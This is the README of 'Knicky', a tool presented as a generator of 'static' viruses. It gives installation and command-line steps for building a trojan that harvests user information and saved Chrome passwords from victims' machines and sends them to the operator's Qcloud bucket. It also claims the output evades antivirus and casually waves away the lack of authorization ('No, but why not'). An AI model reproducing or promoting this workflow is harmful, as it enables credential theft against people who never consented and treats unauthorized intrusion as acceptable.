# Knicky
Yet another module-based static virus generator 
```
There will be a picture
```
## Little FAQ
**What the fuck is static virus??**  
Static virus is the virus/trojan that has already had all its functions been defined and would not be controlled by server side. Instead, it would only send critical information (Chrome password, etc.) slowly and predictedly to server side by tricky ways (Sendgrid, AWS, Qcloud, etc.).  

 
**Why use it??**  
Because the virus generated could always bypass the anti-virus softwares. If not, then make some modification on the modules you are using.  

**Am I authorized to hack others' computer??**  
No, but why not.


## Installation
```bash
$ git clone https://github.com/shouc/knicky.git && cd knicky
$ python -m pip install -r requirements/main.txt --user
```
## Small Examples
#### Using Qcloud (腾讯云)
##### 1. Initialize the Module
Note: *See the help information about such module*
```bash
$ python cli.py qcloudUpdate --help
```
Note: *Replace the information in <> in accordance to your personal information after creating a COS bucket in the panel*
```
$ python -m pip install -r requirements/qcloud.txt --user
$ python cli.py qcloudUpdate --secretID <SecretID> --secretKey <SecretKey> --region <BucketRegion> --bucket <BucketName> -b True
```

##### 2. Have an Overview on Components
See all information about components that are used to communicate with you and the hacked machine (Messenger)
```
$  python cli.py getSendInfo
```
See all information about components that are used to return critical information (Module)
```
$  python cli.py getModuleInfo
```
##### 3. Create a Virus
Note: *By doing so, you created a virus that could send the information of user (userInfo) and Chrome password (chromePassword) of the machine that executed the generated code to you by Qcloud(qcloud)*
```
$ python cli.py createProj userInfo+chromePassword qcloud
```
##### 4. Receive Information
Note: *The information sent to you is encrypted by base64 and you could use following command to decrypt*
```
$ python cli.py listProj
$ python cli.py receiveInfo <project name from foregoing command>
```
